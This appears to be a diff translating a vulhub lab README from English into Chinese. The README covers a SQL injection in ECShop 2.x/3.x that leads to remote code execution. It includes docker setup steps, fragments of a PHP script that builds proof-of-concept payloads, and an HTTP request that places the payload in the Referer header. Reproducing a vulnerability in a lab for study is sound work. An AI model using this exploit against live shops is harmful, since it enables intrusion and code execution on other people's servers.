@@ -1,34 +1,30 @@
-# ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability
+# ECShop 2.x/3.x SQL注入/任意代码执行漏洞
 
-[中文版本(Chinese version)](README.zh-cn.md)
+ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。
 
-ECShop is a B2C independent shop system for companies and individuals to quickly build personalized online store. This system is a cross-platform open source program based on PHP language and MYSQL database architecture.
+其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。
 
-In 2017 and previous versions, there was a SQL injection vulnerability that could inject payload and eventually lead to code execution vulnerabilities. The latest version of 3.6.0 has fixed the vulnerability, and vulhub uses its latest version 2.7.3 and 3.6.0 non-latest version versions to reproduce the vulnerability.
-
-Reference link:
+参考链接：
 
 - http://ringk3y.com/2018/08/31/ecshop2-x代码执行/
 
-## Environment setup
+## 环境搭建
 
-Run the following commands to start environment
+执行如下命令启动ecshop 2.7.3与3.6.0：
 
 ```
 docker-compose up -d
 ```
 
-After the environment start, visit `http://your-ip:8080`, you will see the 2.7.3 installation page. Visit `http://your-ip:8081`, you will see the 3.6.0 installation page.
+环境启动后，访问`http://your-ip:8080`将看到2.7.3的安装页面，访问`http://your-ip:8081`将看到3.6.0的安装页面。
 
-Install both of them, mysql address is `mysql`, mysql account and password are `root`, the database name is free to fill in, but the database names of 2.7.3 and 3.6.0 can not be the same. 
-
-As the picture shows:
+依次安装二者，mysql地址填写`mysql`，mysql账户与密码均为`root`，数据库名随意填写，但2.7.3与3.6.0的数据库名不能相同。如图：
 
 ![](0.png)
 
-## Expliot
+## 漏洞复现
 
-There is a script that can generate POC for 2.x and 3.x:
+我编写了一个脚本，可以生成2.x和3.x的POC：
 
 ```php
 <?php
@@ -50,7 +46,7 @@ echo "\n\nPOC for ECShop 3.x: \n";
 echo "{$hash3}ads|{$s}{$hash3}";
 ```
 
-Put POC in the HTTP-Referer:
+生成的POC，放在Referer里发送：
 
 ```
 GET /user.php?act=login HTTP/1.1
@@ -67,10 +63,10 @@ Cache-Control: max-age=0
 
 ```
 
-Result of 2.x:
+2.x的执行结果
 
 ![](1.png)
 
-Result of 3.x:
+3.x的执行结果：
 
 ![](2.png)
